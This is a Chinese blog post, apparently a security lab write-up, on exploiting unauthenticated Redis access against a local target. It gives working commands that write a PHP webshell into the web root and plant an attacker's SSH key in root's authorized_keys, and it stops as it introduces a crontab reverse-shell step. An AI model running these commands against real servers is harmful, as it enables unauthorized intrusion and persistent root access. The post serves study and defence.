

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
  <link rel="icon" href="/img/icon.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Winter">
  <meta name="keywords" content="">
  
    <meta name="description" content="redis相关redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string、list、set、zset和hash。这些数据类型都支持push&#x2F;pop、add&#x2F;remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了证效率，数据">
<meta property="og:type" content="article">
<meta property="og:title" content="redis系列安全问题整理">
<meta property="og:url" content="http://example.com/2025/09/04/redis%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/index.html">
<meta property="og:site_name" content="Winter">
<meta property="og:description" content="redis相关redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string、list、set、zset和hash。这些数据类型都支持push&#x2F;pop、add&#x2F;remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了证效率，数据">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241007214855918.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241007215049741.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241007221405793.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241007221243082.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241007221830020.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241007223550599.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241007223804643.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241007224937123.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241007225001630.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241007225114229.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241023180830561.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241023181041441.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241023181234686.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241023181421062.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241016140625516.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241016170208249.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241016170547121.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241023182134373.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241023212507905.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241023213647188.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241023212536987.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241023220951181.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241024004739364.png">
<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20241024004906634.png">
<meta property="article:published_time" content="2025-09-04T07:16:43.000Z">
<meta property="article:modified_time" content="2025-09-04T15:03:38.986Z">
<meta property="article:author" content="Winter">
<meta property="article:tag" content="redis">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://img1.plumstar.cn/upload5image-20241007214855918.png">
  
  
  
  <title>redis系列安全问题整理 - Winter</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Winter</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/toolsWebsite/" target="_self">
                <i class="iconfont icon-bookmark-fill"></i>
                <span>工具站</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/wallhaven-w58q8x_1920x1080.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="redis系列安全问题整理"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-09-04 15:16" pubdate>
          2025年9月4日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          4.7k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          40 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">redis系列安全问题整理</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="redis相关"><a href="#redis相关" class="headerlink" title="redis相关"></a>redis相关</h1><p>redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string、list、set、zset和hash。这些数据类型都支持push&#x2F;pop、add&#x2F;remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。</p>
<h2 id="redis常用命令"><a href="#redis常用命令" class="headerlink" title="redis常用命令"></a>redis常用命令</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> xz <span class="hljs-string">&quot;Hacker&quot;</span>                     # 设置键xz的值为字符串Hacker<br>      <span class="hljs-built_in">get</span> xz                              # 获取键xz的内容<br>      <span class="hljs-built_in">SET</span> score 857                       # 设置键score的值为857<br>      INCR score                          # 使用INCR命令将score的值增加1<br>      <span class="hljs-built_in">GET</span> score                           # 获取键score的内容<br>      keys *                              # 列出当前数据库中所有的键<br>     <span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> protected-mode <span class="hljs-literal">no</span>        # 关闭安全模式<br>      <span class="hljs-built_in">get</span> anotherkey                      # 获取一个不存在的键的值<br>     <span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> dir /root/redis          # 设置保存目录<br>     <span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> dbfilename redis.rdb     # 设置保存文件名<br>     <span class="hljs-built_in"> config </span><span class="hljs-built_in">get</span> dir                      # 查看保存目录<br>     <span class="hljs-built_in"> config </span><span class="hljs-built_in">get</span> dbfilename               # 查看保存文件名<br>      save                                # 进行一次备份操作<br>      flushall                            # 删除所有数据<br>      del key                             # 删除键为key的数据<br>      slaveof<span class="hljs-built_in"> ip port </span>                # 设置主从关系<br>      redis-cli -h<span class="hljs-built_in"> ip </span>-p 6379 -a passwd   # 外部连接<br></code></pre></td></tr></table></figure>

<h2 id="Redis基本操作"><a href="#Redis基本操作" class="headerlink" title="Redis基本操作"></a>Redis基本操作</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-number">1</span>.使用<span class="hljs-built_in">SET</span>和<span class="hljs-built_in">GET</span>命令，可以完成基本的赋值和取值操作；<br><span class="hljs-number">2</span>.Redis是不区分命令的大小写的，<span class="hljs-built_in">set</span>和<span class="hljs-built_in">SET</span>是同一个意思；<br><span class="hljs-number">3</span>.使用<span class="hljs-built_in">keys</span> *可以列出当前数据库中的所有键；<br><span class="hljs-number">4</span>.当尝试获取一个不存在的键的值时，Redis会返回空，即(<span class="hljs-literal">nil</span>)；<br><span class="hljs-number">5</span>.如果键的值中有空格，需要使用双引号括起来，如<span class="hljs-string">&quot;Hello World&quot;</span>；<br></code></pre></td></tr></table></figure>

<h2 id="ReRedis配置文件参数"><a href="#ReRedis配置文件参数" class="headerlink" title="ReRedis配置文件参数"></a>ReRedis配置文件参数</h2><p>port参数</p>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm">格式为<span class="hljs-keyword">port</span>后面接端口号，如<span class="hljs-keyword">port</span> 6379，表示Redis服务器将在6379端口上进行监听来等待客户端的连接。<br></code></pre></td></tr></table></figure>

<p>bind参数</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">格式为bind后面接<span class="hljs-built_in">IP</span>地址，可以同时绑定在多个<span class="hljs-built_in">IP</span>地址上，<span class="hljs-built_in">IP</span>地址之间用空格分离，如bind <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span> <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>，表允许<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span>和<span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>两个<span class="hljs-built_in">IP</span>连接。如果设置为<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>则表示任意<span class="hljs-built_in">ip</span>都可连接，说白了就是白名单。<br></code></pre></td></tr></table></figure>

<p>save参数</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs fortran">格式为<span class="hljs-keyword">save</span> &lt;秒数&gt; &lt;变化数&gt;，表示在指定的秒数内数据库存在指定的改变数时自动进行备份（Redis是内存数据库，这里的备份就是指把内存中的数据备份到磁盘上）。可以同时指定多个<span class="hljs-keyword">save</span>参数，如：<br><span class="hljs-keyword">save</span> <span class="hljs-number">900</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">save</span> <span class="hljs-number">300</span> <span class="hljs-number">10</span><br><span class="hljs-keyword">save</span> <span class="hljs-number">60</span> <span class="hljs-number">10000</span><br>表示如果数据库的内容在<span class="hljs-number">60</span>秒后产生了<span class="hljs-number">10000</span>次改变，或者<span class="hljs-number">300</span>秒后产生了<span class="hljs-number">10</span>次改变，或者<span class="hljs-number">900</span>秒后产生了<span class="hljs-number">1</span>次改变，那么立即进行备份操作。<br></code></pre></td></tr></table></figure>

<p>requirepass参数</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">格式为requirepass后接指定的密码，用于指定客户端在连接Redis服务器时所使用的密码。Redis默认的密码参数是空的，说明不需要密码即可连接；同时，配置文件有一条注释了的requirepass foobared命令，如果去掉注释，表示需要使用foobared密码才能连接Redis数据库。<br></code></pre></td></tr></table></figure>

<p>dir参数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">格式为<span class="hljs-built_in">dir</span>后接指定的路径，默认为<span class="hljs-built_in">dir</span> ./，指明Redis的工作目录为当前目录，即redis-server文件所在的目录。注意，Redis产生的备份文件将放在这个目录下。<br></code></pre></td></tr></table></figure>

<p>dbfilename参数</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">格式为dbfilename后接指定的文件名称，用于指定Redis备份文件的名字，默认为dbfilename <span class="hljs-keyword">dump</span>.rdb，即备份文件的名字为<span class="hljs-keyword">dump</span>.rdb。<br></code></pre></td></tr></table></figure>

<p>config命令</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">通过<span class="hljs-built_in">config</span>命令可以读取和设置<span class="hljs-keyword">dir参数以及dbfilename参数，因为这条命令比较危险（实验将进行详细介绍），所以Redis在配置文件中提供了rename-command参数来对其进行重命名操作，如rename-command </span><span class="hljs-built_in">CONFIG</span> HTCMD，可以将<span class="hljs-built_in">CONFIG</span>命令重命名为HTCMD。配置文件默认是没有对<span class="hljs-built_in">CONFIG</span>命令进行重命名操作的。<br></code></pre></td></tr></table></figure>

<p>protected-mode参数</p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">redis3<span class="hljs-number">.2</span>之后添加了protected-mode安全模式，默认值为<span class="hljs-literal">yes</span>，开启后禁止外部连接，所以在测试时，先在配置中修改为<span class="hljs-literal">no</span>。<br></code></pre></td></tr></table></figure>

<h1 id="redis漏洞利用原理"><a href="#redis漏洞利用原理" class="headerlink" title="redis漏洞利用原理"></a>redis漏洞利用原理</h1><p>Redis 提供了2种不同的持久化方式，RDB方式和AOF方式.</p>
<ul>
<li>RDB 持久化可以在指定的时间间隔内生成数据集的时间点快照</li>
<li>AOF 持久化记录服务器执行的所有写操作命令.</li>
</ul>
<p>经过查看官网文档发现AOF方式备份数据库的文件名默认为appendonly.aof，可以在配置文件中通过appendfilename设置其他名称，通过测试发现不能在客户端交互中动态设置appendfilename，所以不能通过AOF方式备份写任意文件.</p>
<ul>
<li>RDB方式备份数据库的文件名默认为dump.rdb，此文件名可以通过客户端交互动态设置dbfilename来更改，造成可以写任意文件.</li>
</ul>
<h1 id="redis-未授权访问漏洞"><a href="#redis-未授权访问漏洞" class="headerlink" title="redis 未授权访问漏洞"></a>redis 未授权访问漏洞</h1><p>其实最关键的便是未授权可以访问redis导致一系列漏洞单独整理一篇redis相关的未授权访问漏洞的利用，还是有比较多的利用方式</p>
<p>漏洞编号：<strong>cnvd_2015_07557</strong></p>
<h2 id="漏洞简介以及危害"><a href="#漏洞简介以及危害" class="headerlink" title="漏洞简介以及危害"></a>漏洞简介以及危害</h2><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接用在线靶场也是可以的</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://download.redis.io/releases/redis-<span class="hljs-number">2</span>.<span class="hljs-number">8</span>.<span class="hljs-number">17</span>.tar.gz<br><span class="hljs-attribute">tar</span> xzvf redis-<span class="hljs-number">2</span>.<span class="hljs-number">8</span>.<span class="hljs-number">17</span>.tar.gz  #解压安装包<br><span class="hljs-attribute">cd</span> redis-<span class="hljs-number">2</span>.<span class="hljs-number">8</span>.<span class="hljs-number">17</span>  # 进入redis目录<br><span class="hljs-attribute">make</span> #编译<br></code></pre></td></tr></table></figure>

<p><img src="https://img1.plumstar.cn/upload5image-20241007214855918.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> src/ <span class="hljs-comment">#进入src目录 </span><br><span class="hljs-built_in">cp</span> redis-server /usr/bin/ <br><span class="hljs-built_in">cp</span> redis-cli /usr/bin/      <span class="hljs-comment">#将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）</span><br><span class="hljs-built_in">cd</span> ..   <span class="hljs-comment"># 返回上一级目录</span><br><span class="hljs-built_in">cp</span> redis.conf /etc/     <span class="hljs-comment">#将redis.conf拷贝到/etc/目录下</span><br>redis-server /etc/redis.conf  <span class="hljs-comment"># 使用/etc/目录下的redis.conf文件中的配置启动redis服务</span><br></code></pre></td></tr></table></figure>

<p><img src="https://img1.plumstar.cn/upload5image-20241007215049741.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>为了方便，在windows攻击机里下载一个redis clinet</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/caoxinyu/RedisClient/releases">https://github.com/caoxinyu/RedisClient/releases</a> （利用redis写webshell测试使用）</p>
<p><img src="https://img1.plumstar.cn/upload5image-20241007221405793.png" srcset="/img/loading.gif" lazyload></p>
<p>使用redis clinet 直接无账号成功登录redis，从登录结果可以看出redis未启用认证。</p>
<p><img src="https://img1.plumstar.cn/upload5image-20241007221243082.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="直接写shell"><a href="#直接写shell" class="headerlink" title="直接写shell"></a>直接写shell</h3><p>未授权验证成功，可以直接往里写webshell</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">利用前提：<br>靶机redis未授权，在攻击机能用redis clinet连接，如上图，并未登录验证<br>靶机开启web服务，并且知道网站路径，还需要具有文件读写增删改查权限<br></code></pre></td></tr></table></figure>

<p>这里我们调出Console，用来执行命令</p>
<p><img src="https://img1.plumstar.cn/upload5image-20241007221830020.png" srcset="/img/loading.gif" lazyload></p>
<p>我们这里因为是本地搭建，靶机网站路径：&#x2F;var&#x2F;www&#x2F;html&#x2F;，将shell写在这个目录下即可</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">config set dir /var/www/html</span><br><span class="language-xml">config set dbfilename test.php</span><br><span class="language-xml">set webshell &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure>

<p><img src="https://img1.plumstar.cn/upload5image-20241007223550599.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://img1.plumstar.cn/upload5image-20241007223804643.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://img1.plumstar.cn/upload5image-20241007224937123.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://img1.plumstar.cn/upload5image-20241007225001630.png" srcset="/img/loading.gif" lazyload></p>
<p>执行完之后去靶机查看目录下，成功写入webshell</p>
<p><img src="https://img1.plumstar.cn/upload5image-20241007225114229.png" srcset="/img/loading.gif" lazyload></p>
<p>后续后渗透这里就不再继续下去了，这里同样也可以直接反弹shell</p>
<h3 id="写-ssh-keygen-公钥登录服务器"><a href="#写-ssh-keygen-公钥登录服务器" class="headerlink" title="写 ssh-keygen 公钥登录服务器"></a>写 ssh-keygen 公钥登录服务器</h3><p>靶机开启redis服务，我这里靶机（redis服务端）为192.168.158.143，是一台kali</p>
<p><img src="https://img1.plumstar.cn/upload5image-20241023180830561.png" srcset="/img/loading.gif" lazyload></p>
<p>SSH提供两种登录验证方式，一种是口令验证也就是账号密码登录，另一种是密钥验证。</p>
<p>所谓密钥验证，其实就是一种基于公钥密码的认证，使用公钥加密、私钥解密，其中公钥是可以公开的，放在服务器端，你可以把同一个公钥放在所有你想SSH远程登录的服务器中，而私钥是保密的只有你自己知道，公钥加密的消息只有私钥才能解密，大体过程如下：</p>
<blockquote>
<p>（1）客户端生成私钥和公钥，并把公钥拷贝给服务器端； </p>
<p>（2）客户端发起登录请求，发送自己的相关信息； </p>
<p>（3）服务器端根据客户端发来的信息查找是否存有该客户端的公钥，若没有拒绝登录，若有则生成一段随机数使用该公钥加密后发送给客户端； </p>
<p>（4）客户端收到服务器发来的加密后的消息后使用私钥解密，并把解密后的结果发给服务器用于验证； </p>
<p>（5）服务器收到客户端发来的解密结果，与自己刚才生成的随机数比对，若一样则允许登录，不一样则拒绝登录。</p>
</blockquote>
<p><strong>条件：</strong></p>
<blockquote>
<p>Redis服务使用ROOT账号启动</p>
<p>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</p>
</blockquote>
<p>在攻击机本地生成公钥文件，为我们的公钥文件设置一个私钥</p>
<p>公钥文件默认路径：&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -t rsa<br><span class="hljs-built_in">cd</span> /root/.ssh<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cat</span> id_rsa.pub<br></code></pre></td></tr></table></figure>

<p><img src="https://img1.plumstar.cn/upload5image-20241023181041441.png" srcset="/img/loading.gif" lazyload></p>
<p>将生成的公钥也就是id_rsa.pub写入ket.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root/.ssh<br>(<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-built_in">cat</span> id_rsa.pub;<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n&quot;</span>)&gt;key.txt<br></code></pre></td></tr></table></figure>

<p>然后通过未授权访问目标机器，将保存ssh的公钥1.txt写入redis缓存（使用redis-cli -h ip命令连接靶机，将文件写入）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/.ssh/key.txt |redis-cli -h 192.168.158.143 -x <span class="hljs-built_in">set</span> pub<br></code></pre></td></tr></table></figure>

<p>然后执行下列命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-cli -h 192.168.158.143<br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /root/.ssh <span class="hljs-comment">#将文件写入这个目录</span><br>config <span class="hljs-built_in">set</span> dbfilename authorized_keys <span class="hljs-comment">#保存文件名为authorized_keys</span><br>save <br></code></pre></td></tr></table></figure>

<p>去靶机root&#x2F;.ssh&#x2F;目录下可以看到成功写入authorized_keys，</p>
<p><img src="https://img1.plumstar.cn/upload5image-20241023181234686.png" srcset="/img/loading.gif" lazyload></p>
<p>利用公钥进行SSH登录攻击机，第一次需要输入yes</p>
<p><img src="https://img1.plumstar.cn/upload5image-20241023181421062.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="利用crontab计划任务反弹shell"><a href="#利用crontab计划任务反弹shell" class="headerlink" title="利用crontab计划任务反弹shell"></a>利用crontab计划任务反弹shell</h3><p><strong>cron介绍</strong><br>我们经常使用的是crontab命令是cron table的简写，它是cron的配置文件，也可以叫它作业列表，我们可以在以下文件夹内找到相关配置文件。</p>
<p>&#x2F;var&#x2F;spool&#x2F;cron&#x2F; 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名<br>&#x2F;etc&#x2F;crontab 这个文件负责调度各种管理和维护任务。<br>&#x2F;etc&#x2F;cron.d&#x2F; 这个目录用来存放任何要执行的crontab文件或脚本。<br>我们还可以把脚本放在&#x2F;etc&#x2F;cron.hourly、&#x2F;etc&#x2F;cron.daily、&#x2F;etc&#x2F;cron.weekly、&#x2F;etc&#x2F;cron.monthly目录中，让它每小时&#x2F;天&#x2F;星期、月执行一次。<br>其他crontab知识可以参考：<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a></p>
